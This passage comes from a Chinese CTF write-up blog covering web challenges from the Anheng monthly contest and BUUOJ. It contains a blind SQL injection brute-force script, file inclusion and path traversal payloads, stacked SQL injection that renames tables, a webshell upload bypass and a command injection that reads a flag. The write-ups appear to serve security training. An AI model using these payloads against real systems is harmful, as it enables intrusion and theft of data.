operator">=</span> f<span class="token string">"or/**/ord(right(left((select/**/password/**/from/**/users/**/limit/**/9,1),{i}),1))={j}#"</span>    <span class="token comment" spellcheck="true">#ord(right(left(database(),1),1))>0#</span>    <span class="token comment" spellcheck="true">#select username from security.users limit 0,1</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"1\\"</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> payload    <span class="token punctuation">}</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"Login success!"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">for</span> z <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        low <span class="token operator">=</span> <span class="token number">0</span><span class="token comment" spellcheck="true">#32</span>        high <span class="token operator">=</span> <span class="token number">127</span><span class="token comment" spellcheck="true">#127</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>low<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> exp<span class="token punctuation">(</span>x<span class="token punctuation">,</span> i<span class="token punctuation">,</span> z<span class="token punctuation">)</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>最终得到flag</p><p><img src="../../../../medias/img//clip_image038.jpg" alt="img"></p><h3 id="简单的文件包含？"><a href="#简单的文件包含？" class="headerlink" title="简单的文件包含？"></a>简单的文件包含？</h3><p><img src="../../../../medias/img//image-20200925201023539.png" alt="image-20200925201023539"></p><p>使用client-ip构造127.0.0.1绕过</p><p>拿到源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_CLIENT_IP'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'127.0.0.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_REAL_IP'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Do u think that I dont know X-Forwarded-For?&lt;br>Too young too simple sometimes naive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Sorry, this site is only optimized for those who comes from localhost"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>简单的文件包含，但是之前已经包含了flag.php，<code>include_once</code>只能包含一次，所以要饶过他</p><p><a href="https://www.anquanke.com/post/id/213235#h3-5" target="_blank" rel="noopener">分析链接</a></p><p><img src="../../../../medias/img//image-20200925201523855.png" alt="image-20200925201523855"></p><p>payload:</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//202.119.201.197:13002/</span><span class="token constant">POST</span><span class="token punctuation">:</span>f<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=/x/../proc/self/cwd/flag.php</span></code></pre><p>base64解码即可</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安恒2020七月月赛</title>
      <link href="/2020/08/02/an-heng-2020-qi-yue-yue-sai/"/>
      <url>/2020/08/02/an-heng-2020-qi-yue-yue-sai/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezfileinclude"><a href="#Ezfileinclude" class="headerlink" title="Ezfileinclude"></a>Ezfileinclude</h2><p><a href="http://183.129.189.60:10012/image.php?t=1596551067&amp;f=Z3F5LmpwZw==" target="_blank" rel="noopener">http://183.129.189.60:10012/image.php?t=1596551067&amp;f=Z3F5LmpwZw==</a></p><p>点开后发现是png的图片二进制，<code>Z3F5LmpwZw==</code>base64解码为gqy.jpg，可见为文件包含，分析得</p><p>t参数为时间戳（如果不知道参数的含义也没关系，直接正则匹配获取即可），会根据时间正确与否判断是否包含</p><p>脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> base64<span class="token comment" spellcheck="true">#res=requests.get("http://183.129.189.60:10009/index.php")</span><span class="token comment" spellcheck="true">#p=re.findall(r"t=(.+?)&amp;f",res.text)  也可正则匹配实时获取时间戳</span>order<span class="token operator">=</span><span class="token string">"/gqy.jpg"</span>order<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>order<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token string">"http://183.129.189.60:10012/image.php?t="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&amp;f="</span><span class="token operator">+</span>orderres<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>发现返回的内容与之前一致，说明拼接了目录。</p><p>将order=”../../../../../../etc/passwd”，返回<code>You are not allowed to do that.</code>，说明有waf。</p><p>waf过滤了../，导致了目录穿越不可用，也就无法读到其他源码和flag</p><p>后面看wp才发现这waf写的真奇葩，只验证前个字符，那只要将前几个随便写就行</p><p>order=”abcd/../../../../../../flag”，得flag: <code>flag{847d2f93276a21f084c44f4d74c61ef4}</code></p><p>读取源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"you miss some parameters"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$timestamp</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'t'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token variable">$timestamp</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"what's your time?"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"/../"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"/../"</span> <span class="token operator">||</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"../"</span> <span class="token operator">||</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"./"</span> <span class="token operator">||</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"/."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"/."</span> <span class="token operator">||</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>"<span class="token comment" spellcheck="true">//")) === "//") {</span>        <span class="token keyword">echo</span> <span class="token string">'You are not allowed to do that.'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/img/'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><p><img src="../../../../medias/img/image-20200804224730946.png" alt="image-20200804224730946"></p><p>一直试不出来，先占坑</p><p>（无列名注入+<code>sys.x$schema_flattened_keys</code>来绕过<code>information_schema</code>）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuoj刷题记录</title>
      <link href="/2020/07/20/buuoj-shua-ti-ji-lu/"/>
      <url>/2020/07/20/buuoj-shua-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>记录buuoj写过的题</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>F12看到存在source.php，跳转后看到代码</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span></code></pre><p>可以看到考点为文件包含，传入的file参数先会检查是否在白名单中，第二个是检查传入的字符串中‘?’前的字符串是否在白名单中，第三个是先进行url解码再截取，其实可以直接第二个就构造payload得到flag</p><blockquote><p>Payload:</p><p><a href="http://f5c2ee8f-ee5f-4469-bad8-86c15a958352.node3.buuoj.cn/source.php?file=hint.php?/../../../../../ffffllllaaaagggg" target="_blank" rel="noopener">http://f5c2ee8f-ee5f-4469-bad8-86c15a958352.node3.buuoj.cn/source.php?file=hint.php?/../../../../../ffffllllaaaagggg</a></p></blockquote><p><img src="../../../../medias/img/image-20200723140717985.png" alt="image-20200723140717985"></p><p>截取通过后，include会将hint.php?/ 作为目录，然后不断前转目录，到根目录包含ffffllllaaaagggg<br>也有的情况?后会被解析为get提交的参数，此时可将’?’进行二次url编码。</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>（sqlmap仅能跑出库名，表名为空）</p><p>先使用 1’ or 1=1–+ 发现存在注入</p><p><img src="../../../../medias/img/image-20200723140943242.png" alt="image-20200723140943242"></p><p>加’后报错，然后order by猜出字段为2，union select 1,2 后返回：<br>return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);<br>发现过滤了常用词。</p><p>使用堆叠注入：</p><blockquote><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p></blockquote><p>1’;show tables;–+ //查看表名</p><p><img src="../../../../medias/img/image-20200723141207481.png" alt="image-20200723141207481"></p><p>  ?inject=1’;show columns from `1919810931114514`;–+</p><p>  ?inject=1’;show columns from `words`;–+</p><p>（要在表名加``否则无回显）</p><p>MySQL中反引号和单引号的区别与用法:</p><blockquote><ol><li><p>MySql 中用一对反引号来标注 SQL 语句中的标识，如<strong>数据库名、表名、字段名</strong>等</p></li><li><p>引号用来标注语句中所引用的字符型常量或时间型常量，即<strong>字段值</strong></p></li><li><p>例如：select * from `username` where `name`=”name”</p></li></ol></blockquote><p><img src="../../../../medias/img/image-20200723141506549.png" alt="image-20200723141506549"></p><p><img src="../../../../medias/img/image-20200723141516510.png" alt="image-20200723141516510"></p><p>可以看到flag在1919810931114514中<br>因为语句被过滤严重，但并为过滤改名语句，所以思路是借助本身查询语句，也就是将1919810931114514改名为words，将flag改为id</p><p>/?inject=1’;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag<code> </code>id` VARCHAR(100);–+</p><p>(搜寻中看到有可能修改失败，所以有另一语句：/?inject=1’;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;–+</p><p>)</p><p>改完后输入：1’ or 1=1 –+即可查到flag</p><p><img src="../../../../medias/img/image-20200723141800578.png" alt="image-20200723141800578"></p><p>堆叠注入：<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p><img src="../../../../medias/img/image-20200723141847958.png" alt="image-20200723141847958"></p><p>三种查询结果：</p><p><img src="../../../../medias/img/clip_image002.jpg" alt="img"></p><p><img src="../../../../medias/img/clip_image004.jpg" alt="img"></p><p><img src="../../../../medias/img/clip_image006.jpg" alt="img"></p><p><img src="../../../../medias/img/clip_image008.jpg" alt="img"></p><p>可堆叠注入：1;show databases; show tables;</p><p>网上搜到原题泄露了查询语句：<code>select $_POST[query] || flag from flag</code></p><p>两种方法：</p><ol><li><p>*,1</p></li><li><p>1;set sql_mode=PIPES_AS_CONCAT;select 1</p></li></ol><p>解析：</p><ul><li>在oracle 缺省支持     通过 ‘ || ’ 来实现字符串拼接。</li><li>但在mysql 缺省不支持。需要调整mysql 的sql_mode<pre><code>模式：pipes_as_concat 来实现oracle     的一些功能。</code></pre></li></ul><p>参考：<a href="https://blog.csdn.net/qq_42158602/article/details/103930598" target="_blank" rel="noopener">https://blog.csdn.net/qq_42158602/article/details/103930598</a></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="../../../../medias/img/image-20200805231904896.png" alt="image-20200805231904896"></p><p>由注释可知为<a href="https://xz.aliyun.com/t/2563" target="_blank" rel="noopener">MD5哈希长度拓展攻击</a></p><p><img src="../../../../medias/img/image-20200805232021063.png" alt="image-20200805232021063"></p><p>但是响应包已经返回hash，直接get提交参数path=fa25e54758d5d5c1927781a6ede89f8a，提交后重定向404</p><p><img src="../../../../medias/img/image-20200805232331858.png" alt="image-20200805232331858"></p><p>点击堆栈追踪可看到代码</p><p><img src="../../../../medias/img/image-20200805232412813.png" alt="image-20200805232412813"></p><p><code>view-source:http://6fae3651-6912-4405-8f69-92344febe91f.node3.buuoj.cn/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</code> 读取文件</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>           window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"404.html"</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data|input|zip/is'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>@<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'include($_GET["file"])'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>过滤了ls，data，input，没办法命令执行获取当前文件夹下的内容</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img src="../../../../medias/img/image-20200807141720931.png" alt="image-20200807141720931"></p><blockquote><p><a href="http://f86e6a77-36b2-45db-ac74-9ba92c007216.node3.buuoj.cn/?file=php://filter/read=convert.base64-encode/resource=flag.php" target="_blank" rel="noopener">http://f86e6a77-36b2-45db-ac74-9ba92c007216.node3.buuoj.cn/?file=php://filter/read=convert.base64-encode/resource=flag.php</a></p><p>基本的文件包含</p></blockquote><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>用bp绕过前端验证，上传一句话，发现php已进黑名单</p><p><img src="../../../../medias/img/image-20200807143831219.png" alt="image-20200807143831219"></p><p>返回版本为5.6，改后缀为phtml绕过黑名单验证，成功上传，连接后在根目录发现flag</p><p><img src="../../../../medias/img/image-20200807144032276.png" alt="image-20200807144032276"></p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><blockquote><p>命令执行中的<code>|</code></p><p>127.0.0.1 | ls ../../../</p><p>127.0.0.1 | cat ../../../flag</p></blockquote><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><img src="../../../../medias/img/image-20200912085834738.png" alt="image-20200912085834738"></p><p>响应头提示<code>select * from 'admin' where password=md5($pass,true)</code></p><p><a href="https://www.jianshu.com/p/12125291f50d" target="_blank" rel="noopener">md5注入</a></p><blockquote><p>如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回</p></blockquote><p>输入<code>ffifdyop</code>即可</p><p>进入下一页面，查看注释</p><pre class=" language-php"><code class="language-php"><span 